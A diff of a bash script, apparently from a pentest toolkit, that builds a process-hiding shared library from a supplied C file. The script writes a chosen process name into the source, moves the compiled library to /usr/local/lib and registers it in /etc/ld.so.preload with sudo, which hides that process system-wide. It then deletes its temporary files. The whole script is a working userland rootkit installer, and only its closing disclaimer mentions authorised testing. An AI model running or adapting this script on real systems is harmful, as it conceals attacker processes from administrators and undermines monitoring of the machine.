@@ -1,59 +1,69 @@
 #!/usr/bin/env bash
 
-# Función para crear un nuevo directorio y cambiar a este
+echo -e "\n\033[1;34m_________________________________________________________\033[0m\n"
+
+# Function to create a new directory and change to it
 function mktempdir() {
     new_dir=$(mktemp -d)
-    #echo "Directorio creado en: $new_dir" 
+    echo -e "\033[1;32mDirectory created at: $new_dir\033[0m"
     cd "$new_dir" || return
-    #echo "Cambiado al directorio: $PWD"
+    echo -e "\033[1;33mChanged to directory: $PWD\033[0m"
+    echo -e "\n\033[1;34m_________________________________________________________\033[0m\n"
 }
 
-# Llama a la función para crear el directorio y prepararlo para el uso
+# Call the function to create the directory and prepare it for use
 mktempdir
 
-# Copia los archivos necesarios al nuevo directorio
+# Copy the necessary files to the new directory
 cp /opt/4rji/bin/sheldonfile.c "$new_dir/processhider.c"
 cp /opt/4rji/bin/Makefilesheldon "$new_dir/Makefile"
+echo -e "\033[1;36mFiles copied to the new directory.\033[0m"
+echo -e "\n\033[1;34m_________________________________________________________\033[0m\n"
 
-# Función para preguntar al usuario si desea modificar el archivo processhider.c
-function modificar_archivo() {
-    read -n1 -p " " respuesta
-    case $respuesta in
-        [Ss]* )
+# Function to ask the user if they want to modify the file processhider.c
+function modify_file() {
+    echo -e "\033[1;31mDo you want to modify processhider.c? (y/n): \033[0m"
+    read -n1 response
+    echo ""
+    case $response in
+        [Yy]* )
+            ps -faux | grep sheldon1
             echo ""
-            read -r texto
-
-            # Escapa caracteres especiales en la entrada del usuario para usar en sed
-            texto_escaped=$(echo "$texto" | sed 's/[&/\]/\\&/g')
-
-            # Busca y reemplaza el contenido dentro de las comillas en la línea específica del archivo
-            sed -i "s/\(static const char\* process_to_filter = \)\".*\";/\1\"$texto_escaped\";/" processhider.c
-
-            #echo "Texto agregado con éxito. Mostrando la línea modificada:"
-            #grep "static const char\* process_to_filter = " processhider.c
+            echo -e "\033[1;33mEnter the process name (for sheldon type 'python3'):\033[0m"
+            read -r text
+            text_escaped=$(echo "$text" | sed 's/[&/\]/\\&/g')
+            sed -i "s/\(static const char\* process_to_filter = \)\".*\";/\1\"$text_escaped\";/" processhider.c
+            echo -e "\033[1;32mFile successfully modified.\033[0m"
             ;;
         * )
-            echo " "
+            echo -e "\033[1;31mNo modifications made.\033[0m"
             ;;
     esac
+    echo -e "\n\033[1;34m_________________________________________________________\033[0m\n"
 }
 
-# Llama a la función para preguntar al usuario si quiere modificar el archivo
-modificar_archivo
+# Call the function to ask the user if they want to modify the file
+modify_file
 
-# Compila el código 
-#make
+# Compile the code
 make > /dev/null 2>&1
+if [ $? -eq 0 ]; then
+    echo -e "\033[1;32mCompilation successful.\033[0m"
+else
+    echo -e "\033[1;31mCompilation error.\033[0m"
+fi
+echo -e "\n\033[1;34m_________________________________________________________\033[0m\n"
 
-
-# Mueve la biblioteca al directorio adecuado y lo agrega al ld.so.preload
+# Move the library to the appropriate directory and add it to ld.so.preload
 sudo mv libprocesshider.so /usr/local/lib/
 echo "/usr/local/lib/libprocesshider.so" | sudo tee -a /etc/ld.so.preload > /dev/null
+echo -e "\033[1;36mLibrary added to ld.so.preload.\033[0m"
+echo -e "\n\033[1;34m_________________________________________________________\033[0m\n"
 
-# Borra todos los archivos en el directorio temporal sin pedir confirmación
-adios $new_dir > /dev/null 2>&1
+# Delete all files in the temporary directory without confirmation
+rm -rf "$new_dir" > /dev/null 2>&1
+echo -e "\033[1;32mTemporary files deleted.\033[0m"
+echo -e "\n\033[1;34m_________________________________________________________\033[0m\n"
 
-rm -rf $new_dir > /dev/null 2>&1
-
-
-
+# Final message
+echo -e "\033[1;33mADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.\033[0m"
